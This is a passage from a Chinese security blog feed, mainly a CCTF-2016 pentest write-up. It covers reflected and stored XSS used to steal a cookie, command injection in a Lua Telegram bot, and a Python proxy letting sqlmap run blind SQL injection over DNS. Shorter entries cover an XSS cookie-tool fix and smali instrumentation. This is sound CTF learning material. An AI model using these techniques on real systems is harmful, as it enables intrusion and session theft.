<h1 id="loli之旅">loli之旅</h1><p>打开首页萌了一脸，羞羞的图片，果然是loli.club啊。右键看了一下源码，除了一个注释貌似没有啥其他的信息了。</p>
<pre><code><span class="comment">&lt;!--
powered by PockyNya
诚招前端，请联系邮箱：pocky@loli.club
--&gt;</span>
</code></pre><p>google直接搜索PockyNya，找到其github。</p>
<p><img src="/images/cctf2.png" alt=""></p>
<p>分析第一个仓库pyprint:<br><img src="/images/cctf3.png" alt=""></p>
<p>可以找到一个博客地址：<a href="http://pocky.loli.club:41293/" target="_blank" rel="external">http://pocky.loli.club:41293/</a></p>
<p>有了网址和源码，自然是要对源码做一番审计。这里我其实是用了一个比较猥琐的方式快速找到了源码中的漏洞。<br>在PockNya的github主页上，可以看到他follow了一个人，RicterZ，点进去可以看到自然是这道题目的作者了。由于平时就关注了RicterZ的github和博客。在RicterZ的github也可以看到pyprint这个仓库，是自己博客的开源代码。所以接下来就是把两个仓库都clone下来，diff了一下。~~~</p>
<p>其实对于pyprint这个代码的审计，读一下commit时的comment可以发现很多信息，比直接看代码可以省不少功夫。不过有了diff大法，一切都是浮云。<br><img src="/images/cctf6.png" alt=""></p>
<h2 id="漏洞一">漏洞一</h2><p><img src="/images/cctf5.png" alt=""></p>
<p>看到登录页面login多了一个flag参数，查看模板文件，直接输出在了页面中，存在一个反射XSS。</p>
<pre><code>&lt;form class=<span class="string">"form-horizontal login-form"</span> role=<span class="string">"form"</span> action=<span class="string">"/login?flag="</span> <span class="keyword">method</span>=<span class="string">"post"</span>&gt;
</code></pre><p><img src="/images/cctf7.png" alt=""></p>
<p>反射XSS需要绕过浏览器audit，根据博客文章提示，找到xss地址之后，发到作者邮箱。试了一下才知道，这个XSS是个意外，很快就被修复了。</p>
<p><img src="/images/cctf8.png" alt=""></p>
<h2 id="漏洞二">漏洞二</h2><p><img src="/images/cctf9.png" alt=""></p>
<p>发现addpost这个方法的权限验证去掉了。查看相关模板，发现去掉了urlencode编码。导致越权发布文章，文章内容可以存储型XSS。根据代码中的接口和参数拼接请求。发布存储型XSS文章。将地址发给作者邮箱，获得cookie。cookie中flag参数解码就是最终的flag。</p>
<h2 id="漏洞三">漏洞三</h2><p><img src="/images/cctf10.png" alt=""></p>
<p>FileReadHandler存在任意文件读取的漏洞，看到这里很开心，可是被注释掉了。所有是逗你玩的代码了~~<br><img src="/images/cctf11.png" alt=""></p>
<h2 id="漏洞四">漏洞四</h2><p><img src="/images/cctf12.png" alt=""><br>这里其实也不算漏洞，看到不一样的代码就跟进去看看做了啥。查看日志的时候，验证了cookie。这里当时不记得怎么弄的了，xss打到的cookie早就加了进去，直接拼日志的地址就可以访问了。现在来看只要本地伪造一个cookie就可以绕过这个验证？添加cookie之后可以查看到一篇一个lua脚本的日志。</p>
<p><img src="/images/cctf13.png" alt=""></p>
<p>lua脚本源码：</p>
<pre><code><span class="operator"><span class="keyword">do</span>
<span class="keyword">local</span> <span class="keyword">function</span> run(msg, matches)
  <span class="keyword">if</span> matches[<span class="number">1</span>] ~= <span class="string">'!minecraft'</span> <span class="keyword">then</span>
    operation = matches[<span class="number">1</span>]
  <span class="keyword">else</span>
    <span class="keyword">return</span> <span class="string">"!minecraft start|stop|restart"</span>
  <span class="keyword">end</span>
  <span class="keyword">if</span> <span class="keyword">string</span>.find(operation, <span class="string">'&amp;'</span>) <span class="keyword">or</span> <span class="keyword">string</span>.find(operation, <span class="string">'|'</span>) <span class="keyword">or</span> <span class="keyword">string</span>.find(operation, <span class="string">'`'</span>) <span class="keyword">then</span>
    <span class="keyword">return</span> <span class="string">"Invalid operation "</span> .. operation
  <span class="keyword">end</span>
  <span class="keyword">local</span> <span class="keyword">t</span> = io.popen(<span class="string">'cd /home/telegram &amp;&amp; ./mc '</span> .. operation)
  <span class="keyword">local</span> a = <span class="keyword">t</span>:<span class="keyword">read</span>(<span class="string">"*all"</span>)
  <span class="keyword">return</span> a
<span class="keyword">end</span>
<span class="keyword">return</span> {
  description = <span class="string">"loli.club minecraft bot!"</span>,
  <span class="keyword">usage</span> = <span class="string">"!minecraft start|stop|restart"</span>,
  patterns = {
    <span class="string">"^!minecraft$"</span>,
    <span class="string">"^!minecraft (.*)$"</span>
  },
  run = run
}
<span class="keyword">end</span>%</span>
</code></pre><p>比较明显的命令注入漏洞。参考<a href="http://drops.wooyun.org/papers/1018" target="_blank" rel="external">Shell Injection &amp; Command Injection</a>。没有过滤分号<code>;</code>。</p>
<p>第一次用telegram，找到bot的账号花了一会时间。本身漏洞是比较典型的。</p>
<p><img src="/images/cctf14.png" alt=""></p>
<h1 id="DNS注入">DNS注入</h1><p>这个题目没有做出来。一是没有考虑到别人留的后门，再一个没找到回显的注入方式。writeup可以参考<a href="http://bobao.360.cn/ctf/detail/159.html" target="_blank" rel="external">FlappyPig CCTF-2016 WriteUp</a>。</p>
<p>一开始通过爆破域名，定位到ns.loli.club。发现该dns服务存在一些异常，但没有考虑到SQL注入，放出采用python和mysql搭建之后才考虑到sql注入。</p>
<p>使用nslookup可以简单验证，确实存在SQL注入。</p>
<p><img src="/images/cctf15.png" alt=""></p>
<p>没有找到回显的方式，尝试写一个代理，用sqlmap来进行盲注。发现dns.resolver模块对域名的合法性进行了检查，sqlmap拼出来的域名字段不是合法域名会报错。最后采用了分析dns协议，直接拼接二进制的方式写了一个布尔盲注的代理，用sqlmap跑出了数据。<a href="http://www.lisijie.org/tech/dns%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90.md" target="_blank" rel="external">dns协议解析</a></p>
<p>最终的代码：</p>
<pre><code><span class="comment">#!/usr/bin/env python</span>
<span class="comment"># encoding: utf-8</span>

<span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template
<span class="keyword">from</span> flask <span class="keyword">import</span> request, jsonify
<span class="keyword">import</span> socket
<span class="keyword">import</span> struct
<span class="keyword">import</span> time

app = Flask(__name__)
<span class="function"><span class="keyword">def</span> <span class="title">h2bin</span><span class="params">(x)</span>:</span>
    <span class="keyword">return</span> x.replace(<span class="string">' '</span>, <span class="string">''</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)
dns1 = h2bin(<span class="string">'''  a5 71 01 00 00 01 00 00  00 00 00 00 03 77 77 7704 6c 6f 6c 69'''</span>)
dns3 = h2bin(<span class="string">''' 00 00 01 00 01  '''</span>)
HOST=<span class="string">'120.27.149.210'</span>
PORT=<span class="number">53</span>

<span class="decorator">@app.route("/dns",methods=['GET','POST'])</span>
<span class="function"><span class="keyword">def</span> <span class="title">dnsquery</span><span class="params">()</span>:</span>
    name=request.args.get(<span class="string">'id'</span>)
    name=str(name)
    name_len=len(name)
    <span class="keyword">if</span> name_len&lt;<span class="number">10</span>:
        name_len1=<span class="string">'0'</span>+str(name_len)
    <span class="keyword">else</span>:
        name_len1=hex(name_len)
        <span class="keyword">print</span> name_len1

        <span class="keyword">if</span> len(name_len1)==<span class="number">3</span>:
            name_len1=<span class="string">'0'</span>+name_len1[<span class="number">2</span>:]
            <span class="keyword">print</span> name_len1
        <span class="keyword">else</span>:
            name_len1=name_len1[<span class="number">2</span>:]
            <span class="keyword">print</span> name_len1

    test=str(name_len)+<span class="string">'s'</span>

    <span class="keyword">print</span> test
    dnsdata=dns1+ h2bin(name_len1)+struct.pack(test,name) +dns3
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.sendto(dnsdata,(HOST, PORT))
    <span class="keyword">print</span> <span class="string">'sendall'</span>
    data=s.recv(<span class="number">1024</span>)
    <span class="keyword">return</span> repr(data[-<span class="number">4</span>:])

<span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8765</span>,threaded=<span class="keyword">True</span>)
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/images/cctf4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;CCTF感受&quot;&gt;CCTF感受&lt;/h1&gt;&lt;p&gt;周六花了一天时间做了下CCTF的pentest。还是有不少有意思的收获。这个名字叫pentest，而不是web，感觉也是花了心思的，
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSScookie利用工具cookie-hacker修改版</title>
    <link href="http://xdxd.love/2016/04/12/XSScookie%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7cookie-hacker%E4%BF%AE%E6%94%B9%E7%89%88/"/>
    <id>http://xdxd.love/2016/04/12/XSScookie利用工具cookie-hacker修改版/</id>
    <published>2016-04-12T07:49:06.000Z</published>
    <updated>2016-04-12T07:58:36.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://evilcos.me/?p=366" target="_blank" rel="external">cookiehacker</a>余弦大神些的cookie利用工具，可以方便的把xss收到的cookie写入本地。</p>
<p><img src="http://evilcos.me/wp-content/uploads/2013/10/123.jpg" alt=""><br>使用过程中遇到一个小问题。就是一个字段value值是base64编码的。里面有=号。使用cookiehacker写入的时候把等号自动给去掉了。</p>
<p>查看源码发现是这么写的。</p>
<pre><code>k = c.split(<span class="string">'='</span>)[<span class="number">0</span>].replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">""</span>).replace(<span class="string">' '</span>, <span class="string">'+'</span>);
v = c.split(<span class="string">'='</span>)[<span class="number">1</span>].replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">""</span>).replace(<span class="string">' '</span>, <span class="string">'+'</span>);
</code></pre><p>使用split等号来取值。导致value里的等号丢掉了。修改成使用substring取值，修复这个bug。</p>
<pre><code>k = c.<span class="keyword">substring</span>(<span class="number">0</span>,c.indexOf(<span class="string">'='</span>)).replace(/^\s+|\s+<span class="variable">$/</span>g, <span class="string">""</span>).replace(<span class="string">' '</span>, <span class="string">'+'</span>);
v = c.<span class="keyword">substring</span>(c.indexOf(<span class="string">'='</span>)+ <span class="number">1</span>).replace(/^\s+|\s+<span class="variable">$/</span>g, <span class="string">""</span>).replace(<span class="string">' '</span>, <span class="string">'+'</span>); 
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;http://evilcos.me/?p=366&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;cookiehacker&lt;/a&gt;余弦大神些的cookie利用工具，可以方便的把xss收到的cookie写入本地。&lt;/p&gt;
&lt;p&gt;&lt;img sr
    
    </summary>
    
      <category term="前端安全" scheme="http://xdxd.love/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="http://xdxd.love/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>smali插桩调试apk</title>
    <link href="http://xdxd.love/2016/04/08/smali%E6%8F%92%E6%A1%A9%E8%B0%83%E8%AF%95apk/"/>
    <id>http://xdxd.love/2016/04/08/smali插桩调试apk/</id>
    <published>2016-04-08T01:45:16.000Z</published>
    <updated>2016-04-08T02:28:55.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="参考资料">参考资料</h1><p><a href="http://drops.wooyun.org/papers/6045" target="_blank" rel="external">安卓动态调试七种武器之长生剑 - Smali Instrumentation</a></p>
<p><a href="http://www.52pojie.cn/thread-255754-1-1.html" target="_blank" rel="external">Smali注入之打造属于自己的安卓crack利器</a></p>
<h1 id="利用代码">利用代码</h1><pre><code><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lcrack;</span>
<span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span>
<span class="keyword">.source</span> <span class="string">"crack.java"</span>

<span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span><span class="function"> log(</span><span class="class">Ljava/lang/String;</span><span class="function">)</span>V
<span class="keyword">    .locals</span> 1
<span class="keyword">    .prologue</span>

   <span class="instruction"> const-string </span><span class="variable">v0</span>, <span class="string">"info"</span>
   <span class="instruction"> invoke-static </span>{<span class="variable">v0</span>, <span class="variable">p0</span>}, <span class="class">Landroid/util/Log;</span><span class="function">-&gt;d(</span><span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span><span class="function">)</span>I
   <span class="instruction"> return-void
</span><span class="keyword">.end method</span>
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;参考资料&quot;&gt;参考资料&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://drops.wooyun.org/papers/6045&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;安卓动态调试七种武器之长生剑 - Smali Instrumentatio
    
    </summary>
    
      <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
